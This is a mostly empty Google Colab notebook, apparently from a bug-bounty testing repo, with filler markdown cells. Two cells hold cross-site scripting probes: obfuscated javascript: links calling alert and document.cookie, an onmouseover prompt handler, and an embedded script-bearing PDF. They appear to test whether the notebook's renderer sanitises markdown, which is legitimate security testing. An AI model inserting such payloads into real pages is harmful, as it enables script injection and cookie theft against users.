{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "Test",
      "provenance": [],
      "toc_visible": true,
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/am6539/BurpBounty/blob/master/Test.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "1OPd43PXLLxJ",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        ""
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "ou7M_WBHGUxU",
        "colab_type": "text"
      },
      "source": [
        "# 99999"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "W1o8l20xLZKP",
        "colab_type": "text"
      },
      "source": [
        "12333333333333"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "5UfNfQEe_D_Q",
        "colab_type": "text"
      },
      "source": [
        "# aaa"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "hNeFMXPEG-no",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "from google.colab import drive\n",
        "drive.mount('/content/drive')"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "4yvRGYEuFkO5",
        "colab_type": "text"
      },
      "source": [
        "# aaaaaaaaaaaaaa"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "ow0lELm-EaWY",
        "colab_type": "text"
      },
      "source": [
        "# New Sectionaaaaaaaaaaa"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "QKi9L0i2LbzO",
        "colab_type": "text"
      },
      "source": [
        "b"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "LTleIxU9LiCZ",
        "colab_type": "text"
      },
      "source": [
        "**bold text**# GEGE <a href=\"jAvAsCrIpT&colon;alert&lpar;1&rpar;\">X</a>\n",
        "<embed src=\"http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf\">\n",
        "<var onmouseover=\"prompt(1)\">On Mouse Over</var>\n",
        "<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "h5y3OP0GPN1g",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "ls"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "pSVXgap6_HSc",
        "colab_type": "text"
      },
      "source": [
        "# aa1231"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "knZAGT_eMPMF",
        "colab_type": "text"
      },
      "source": [
        "# 987654321\n",
        "\n",
        "<a href=\"jAvAsCrIpT&colon;alert&lpar;1&rpar;\">X</a>\n",
        "<embed src=\"http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf\">\n",
        "<var onmouseover=\"prompt(1)\">On Mouse Over</var>\n",
        "<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "GvjzKqurGXXF",
        "colab_type": "text"
      },
      "source": [
        "# New Section"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "lcpFFOA2MOwt",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        ""
      ],
      "execution_count": 0,
      "outputs": []
    }
  ]
}